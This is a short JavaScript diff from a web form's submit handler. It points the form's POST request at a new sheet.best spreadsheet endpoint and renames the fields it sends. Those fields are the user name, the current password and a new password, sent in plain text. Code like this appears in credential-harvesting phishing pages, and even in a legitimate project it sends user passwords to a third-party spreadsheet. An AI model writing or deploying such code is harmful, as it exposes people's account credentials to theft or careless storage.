@@ -108,7 +108,7 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://sheet.best/api/sheets/97b256d9-046c-4e18-9a45-072b92d5b36e', {
+    const respuesta = await fetch('https://sheet.best/api/sheets/2c5062d4-2f46-4000-9a2b-4cdfa0c7b986', {
         method: 'POST',
         mode: 'cors',
         headers: {
@@ -116,8 +116,8 @@ try {
         },
         body: JSON.stringify({
             "Cliente": formulario.usuario.value,
-            "contra1": formulario.contraseña.value,
-            "nueva": formulario.confirmar.value
+            "ContraseñaActual": formulario.contraseña.value,
+            "ContraseñaNueva": formulario.confirmar.value
         })
     });
 
